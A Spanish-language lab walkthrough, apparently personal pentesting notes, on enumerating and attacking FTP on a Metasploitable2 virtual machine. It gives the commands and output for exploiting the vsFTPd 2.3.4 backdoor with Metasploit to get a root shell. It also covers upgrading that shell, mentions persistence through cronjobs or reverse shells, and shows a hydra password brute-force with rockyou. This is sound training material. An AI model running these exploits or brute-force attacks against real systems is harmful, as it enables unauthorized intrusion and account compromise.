Parte de [[Enumeracion de Servicios]]

Es un protocolo donde la informacion se trasmite en claro, para poder enumerar FTP se requiere un usuario valido en el servicio, no obstante a veces existe el usuario Anonymous

En el caso de metasploitable2, podemos:

``` bash
ftp 192.168.56.102
Connected to 192.168.56.102.
220 (vsFTPd 2.3.4)
Name (192.168.56.102:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> 
```

Comandos de ftp serian:
- help: ver todos los comandos
- help {comando}: ver que hace un comando
- pwd: ver directorio
- dir / ls: ver directorio
- !: ejecutar comandos en la maquina local (!ls para listar la maquina local)
- put: intentar subir ficheros
- get: Descargar fichero
- mget: Descargar ficheros masivamente
- put: subir ficheros
- mput: subir ficheros masivamente
- mkdir: crear carpetas
- rm: borrar

Como en todos los servicios es importante saber el tipo de servidor FTP y su version.

Si estamos en una situacion en la que estamos en un carpeta sin nada, significa que podriamos estar enjaulados (es decir: en una carpeta del sistema que no contiene nada y no poder salir a carpetas superiores)(ver termino: **chrooted**), podemos intentar escapar usando cd con rutas relativas o absolutas. Tambien se debe comprobar si podemos subir o bajar (en caso de que la carpeta este vacia, obviamente no) archivos.

Por ejemplo en el caso de metasploitable 2:


```
ftp> pwd
Remote directory: /
ftp> cd ..
250 Directory successfully changed.
ftp> pwd
Remote directory: /
ftp> dir
229 Entering Extended Passive Mode (|||30797|).
150 Here comes the directory listing.
226 Directory send OK.
ftp> 
```

Estamos en un sistema Linux, aparentemente en la carpeta raiz pero sin ninguna subcarpeta  (donde deberiamos tener etc, dev, home...). Esto es señal de que estamos enjaulados.

En FTP tienes los permisos del usuario con el que este logeado, si por ejemplo tu usario no puede escribir en /etc, no podras hacer put, pero si podras en /home/{tuUsuario} por ejemplo.

---

### Ejercicio: Encontrar todos los scripts de nmap que tengan que ver con FTP y ver si hay alguno relacionado con vsFTPd:

Comando:

``` bash
ls /usr/share/nmap/scripts | grep ftp
```

Resultado:

``` bash
ftp-anon.nse
ftp-bounce.nse
ftp-brute.nse
ftp-libopie.nse
ftp-proftpd-backdoor.nse
ftp-syst.nse
ftp-vsftpd-backdoor.nse
ftp-vuln-cve2010-4221.nse
tftp-enum.nse
tftp-version.nse
```

Ahora lanzaremos ftp-vsftpd-backdoor.nse:

``` bash
sudo nmap -Pn --script ftp-vsftpd-backdoor.nse 192.168.56.102
```

Resultado:

``` java
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-23 18:14 CET
Nmap scan report for 192.168.56.102
Host is up (0.00015s latency).
Not shown: 977 closed tcp ports (reset)
PORT     STATE SERVICE
21/tcp   open  ftp
| ftp-vsftpd-backdoor: 
|   VULNERABLE:
|   vsFTPd version 2.3.4 backdoor
|     State: VULNERABLE (Exploitable)
|     IDs:  BID:48539  CVE:CVE-2011-2523
|       vsFTPd version 2.3.4 backdoor, this was reported on 2011-07-04.
|     Disclosure date: 2011-07-03
|     Exploit results:
|       Shell command: id
|       Results: uid=0(root) gid=0(root)
|     References:
|       http://scarybeastsecurity.blogspot.com/2011/07/alert-vsftpd-download-backdoored.html
|       https://www.securityfocus.com/bid/48539
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-2523
|_      https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/unix/ftp/vsftpd_234_backdoor.rb
22/tcp   open  ssh
23/tcp   open  telnet
25/tcp   open  smtp
53/tcp   open  domain
80/tcp   open  http
111/tcp  open  rpcbind
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
512/tcp  open  exec
513/tcp  open  login
514/tcp  open  shell
1099/tcp open  rmiregistry
1524/tcp open  ingreslock
2049/tcp open  nfs
2121/tcp open  ccproxy-ftp
3306/tcp open  mysql
5432/tcp open  postgresql
5900/tcp open  vnc
6000/tcp open  X11
6667/tcp open  irc
8009/tcp open  ajp13
8180/tcp open  unknown
MAC Address: 08:00:27:7B:8B:9E (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.43 seconds
```

En resumen, es vulnerable.

Ahora para su explotacion, usaremos metasploit:

``` bash
use exploit/unix/ftp/vsftpd_234_backdoor 
```

Configuramos:

``` bash
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > show options

Module options (exploit/unix/ftp/vsftpd_234_backdoor):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   CHOST                     no        The local client address
   CPORT                     no        The local client port
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                    yes       The target host(s), see https://docs.metasploit.com/docs/using
                                       -metasploit/basics/using-metasploit.html
   RPORT    21               yes       The target port (TCP)


Exploit target:

   Id  Name
   --  ----
   0   Automatic



View the full module info with the info, or info -d command.

msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 192.168.56.102
RHOSTS => 192.168.56.102
```

Ahora podemos simplemente lanzar el exploit:

``` bash
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > exploit

[*] 192.168.56.102:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 192.168.56.102:21 - USER: 331 Please specify the password.
[+] 192.168.56.102:21 - Backdoor service has been spawned, handling...
[+] 192.168.56.102:21 - UID: uid=0(root) gid=0(root)
[*] Found shell.
[*] Command shell session 1 opened (192.168.56.100:44239 -> 192.168.56.102:6200) at 2025-01-23 18:18:34 +0100

whoami
root
pwd
/
```

Somos root, una buena idea ahora podria ser avanzar la sesion de bash a meterpreter.

Antes de eso, vamos a mejorar la dumb shell a una shell completamente interactiva:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

Y listo, realmente esta maquina estaria completamente comprometida y tenemos una interaccion usable, otras opciones serian crear un cronjob con ssh o una reverse shell para persistencia.

En otro ejercicio:

>Crear un fichero llamado usuarios.txt con los usuarios ftp, service y sys y realizar un ataque de fuerza bruta de contraseñas con rockyou

``` bash
hydra -L usuarios.txt -P rockyou.txt ftp://192.168.56.102:21 -e nsr -t 5
```

En el resultado:

``` java
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-01-23 18:33:32
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 5 tasks per 1 server, overall 5 tasks, 43033206 login tries (l:3/p:14344402), ~8606642 tries per task
[DATA] attacking ftp://192.168.56.102:21/
[21][ftp] host: 192.168.56.102   login: ftp
[21][ftp] host: 192.168.56.102   login: ftp   password: ftp
[21][ftp] host: 192.168.56.102   login: ftp   password: ptf
[21][ftp] host: 192.168.56.102   login: ftp   password: 123456
[21][ftp] host: 192.168.56.102   login: ftp   password: 12345
[21][ftp] host: 192.168.56.102   login: service   password: service
[STATUS] 28688890.00 tries/min, 28688890 tries in 00:01h, 14344316 to do in 00:01h, 5 active
[STATUS] 14344485.50 tries/min, 28688971 tries in 00:02h, 14344235 to do in 00:01h, 5 active
[STATUS] 9563018.67 tries/min, 28689056 tries in 00:03h, 14344150 to do in 00:02h, 5 active
[STATUS] 7172286.25 tries/min, 28689145 tries in 00:04h, 14344061 to do in 00:02h, 5 active
[STATUS] 5718784.78 tries/min, 28689237 tries in 00:05h, 14343969 to do in 00:03h, 5 active
[STATUS] 4088753.30 tries/min, 28689419 tries in 00:07h, 14343787 to do in 00:04h, 5 active

```

FTP admite varias contraseñas, esto es por el inicio de sesion con anonymous de ftp.